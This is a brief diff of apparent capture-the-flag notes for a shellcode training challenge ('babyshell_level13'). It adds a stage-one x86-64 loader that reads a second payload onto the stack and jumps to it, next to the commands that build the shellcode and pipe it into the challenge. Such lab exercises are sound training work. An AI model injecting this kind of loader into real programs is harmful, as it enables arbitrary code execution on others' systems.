@@ -666,7 +666,17 @@ objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level13
 
-
+# alt stage1
+ .global _start
+_start:
+.intel_syntax noprefix
+xor eax, eax
+shr edi, 16
+mov rsi, rsp
+mov dx, 1000
+syscall
+jmp rsp
+nop
 
 
 mov al, 90
